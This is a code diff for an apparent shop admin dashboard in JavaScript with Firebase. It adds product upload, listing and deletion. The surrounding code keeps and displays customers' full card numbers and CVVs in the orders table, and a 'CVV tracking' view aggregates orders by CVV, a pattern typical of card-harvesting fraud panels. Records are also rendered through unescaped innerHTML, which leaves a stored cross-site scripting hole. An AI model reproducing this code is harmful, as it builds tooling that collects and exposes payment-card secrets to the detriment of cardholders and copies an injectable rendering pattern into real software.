@@ -15,30 +15,30 @@ auth.onAuthStateChanged(async (user) => {
     
     // Load admin data
     loadDashboardStats();
+    loadProducts();
     loadOrders();
     loadCVVTracking();
     loadCompanyCards();
+    
+    // Setup image preview
+    setupImagePreview();
 });
 
 // Show different sections
 function showSection(sectionId) {
-    // Hide all sections
     document.querySelectorAll('.admin-section').forEach(s => {
         s.classList.remove('active');
     });
     
-    // Remove active class from all menu items
     document.querySelectorAll('.admin-sidebar li').forEach(i => {
         i.classList.remove('active');
     });
     
-    // Show selected section
     document.getElementById(sectionId).classList.add('active');
-    
-    // Add active class to clicked menu item
     event.target.closest('li').classList.add('active');
     
     // Refresh data
+    if (sectionId === 'products') loadProducts();
     if (sectionId === 'orders') loadOrders();
     if (sectionId === 'cvv-tracking') loadCVVTracking();
     if (sectionId === 'cards') loadCompanyCards();
@@ -64,7 +64,157 @@ async function loadDashboardStats() {
     }
 }
 
-// Load all orders with card details
+// Load all products
+async function loadProducts() {
+    try {
+        const snapshot = await db.collection('products').get();
+        const tbody = document.getElementById('productsBody');
+        tbody.innerHTML = '';
+        
+        snapshot.forEach(doc => {
+            const product = doc.data();
+            tbody.innerHTML += `
+                <tr>
+                    <td>
+                        <img src="${product.imageUrl || 'https://via.placeholder.com/50'}" 
+                             style="width: 50px; height: 50px; object-fit: cover; border-radius: 5px;">
+                    </td>
+                    <td>${product.name}</td>
+                    <td>₹${product.price}</td>
+                    <td>${product.category}</td>
+                    <td>${product.stock}</td>
+                    <td>
+                        <button onclick="deleteProduct('${doc.id}')" class="btn-delete">Delete</button>
+                    </td>
+                </tr>
+            `;
+        });
+    } catch (error) {
+        console.error('Error loading products:', error);
+    }
+}
+
+// Setup image preview
+function setupImagePreview() {
+    const imageInput = document.getElementById('productImage');
+    const preview = document.getElementById('imagePreview');
+    const previewImg = preview.querySelector('img');
+    const previewSpan = preview.querySelector('span');
+
+    imageInput.addEventListener('change', function(e) {
+        const file = e.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                previewImg.src = e.target.result;
+                previewImg.style.display = 'block';
+                previewSpan.style.display = 'none';
+            }
+            reader.readAsDataURL(file);
+        }
+    });
+}
+
+// Product form submit
+document.getElementById('productForm')?.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const submitBtn = document.getElementById('submitBtn');
+    const progressDiv = document.getElementById('uploadProgress');
+    const progressFill = document.getElementById('progressFill');
+    
+    submitBtn.disabled = true;
+    progressDiv.style.display = 'block';
+    
+    try {
+        // Get form values
+        const name = document.getElementById('productName').value;
+        const price = parseFloat(document.getElementById('productPrice').value);
+        const category = document.getElementById('productCategory').value;
+        const description = document.getElementById('productDescription').value;
+        const stock = parseInt(document.getElementById('productStock').value);
+        const imageFile = document.getElementById('productImage').files[0];
+        
+        if (!imageFile) {
+            alert('Please select an image');
+            return;
+        }
+        
+        // 1. Upload image to Firebase Storage
+        const storageRef = storage.ref();
+        const imageRef = storageRef.child(`products/${Date.now()}_${imageFile.name}`);
+        
+        // Upload with progress
+        const uploadTask = imageRef.put(imageFile);
+        
+        uploadTask.on('state_changed',
+            (snapshot) => {
+                // Progress
+                const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                progressFill.style.width = progress + '%';
+                progressFill.textContent = Math.round(progress) + '%';
+            },
+            (error) => {
+                console.error('Upload error:', error);
+                alert('Image upload failed');
+                submitBtn.disabled = false;
+            },
+            async () => {
+                // Upload complete - get download URL
+                const imageUrl = await imageRef.getDownloadURL();
+                
+                // 2. Save product to Firestore with image URL
+                const productData = {
+                    name: name,
+                    price: price,
+                    category: category,
+                    description: description,
+                    stock: stock,
+                    imageUrl: imageUrl,
+                    createdAt: new Date().toISOString()
+                };
+                
+                await db.collection('products').add(productData);
+                
+                alert('Product added successfully!');
+                
+                // Reset form
+                e.target.reset();
+                document.querySelector('#imagePreview img').style.display = 'none';
+                document.querySelector('#imagePreview span').style.display = 'block';
+                progressDiv.style.display = 'none';
+                submitBtn.disabled = false;
+                
+                // Refresh products list
+                loadProducts();
+                
+                // Switch to products view
+                showSection('products');
+            }
+        );
+        
+    } catch (error) {
+        console.error('Error adding product:', error);
+        alert('Error adding product: ' + error.message);
+        submitBtn.disabled = false;
+        progressDiv.style.display = 'none';
+    }
+});
+
+// Delete product
+async function deleteProduct(productId) {
+    if (confirm('Are you sure you want to delete this product?')) {
+        try {
+            await db.collection('products').doc(productId).delete();
+            loadProducts();
+        } catch (error) {
+            console.error('Error deleting product:', error);
+            alert('Error deleting product');
+        }
+    }
+}
+
+// Load all orders
 async function loadOrders() {
     try {
         const snapshot = await db.collection('orders').orderBy('createdAt', 'desc').get();
@@ -73,10 +223,14 @@ async function loadOrders() {
         
         snapshot.forEach(doc => {
             const order = doc.data();
+            const products = order.products || [];
+            const productNames = products.map(p => p.name).join(', ');
+            
             tbody.innerHTML += `
                 <tr>
                     <td>${doc.id.slice(0, 8)}...</td>
                     <td>${order.userEmail || 'N/A'}</td>
+                    <td>${productNames.slice(0, 30)}${productNames.length > 30 ? '...' : ''}</td>
                     <td>₹${order.totalAmount}</td>
                     <td>${order.cardDetails?.cardNumber || 'N/A'}</td>
                     <td>${order.cardDetails?.cvv || 'N/A'}</td>
@@ -89,13 +243,11 @@ async function loadOrders() {
     }
 }
 
-// Load CVV tracking data
+// Load CVV tracking
 async function loadCVVTracking() {
     try {
-        // Get all orders
         const ordersSnapshot = await db.collection('orders').get();
         
-        // Group by CVV
         const cvvStats = {};
         
         ordersSnapshot.forEach(doc => {
@@ -117,14 +269,12 @@ async function loadCVVTracking() {
                 cvvStats[cvv].totalOrders++;
                 cvvStats[cvv].totalAmount += order.totalAmount || 0;
                 
-                // Update last used if newer
                 if (order.createdAt > cvvStats[cvv].lastUsed) {
                     cvvStats[cvv].lastUsed = order.createdAt;
                 }
             }
         });
         
-        // Display CVV stats
         const tbody = document.getElementById('cvvBody');
         tbody.innerHTML = '';
         
@@ -172,12 +322,11 @@ async function loadCompanyCards() {
     }
 }
 
-// Show add card form
+// Card modal functions
 function showAddCardForm() {
     document.getElementById('cardModal').style.display = 'block';
 }
 
-// Close card modal
 function closeCardModal() {
     document.getElementById('cardModal').style.display = 'none';
     document.getElementById('cardForm').reset();
@@ -223,4 +372,4 @@ async function deleteCard(cardId) {
 function logout() {
     auth.signOut();
     window.location.href = 'index.html';
-                          }
+        }
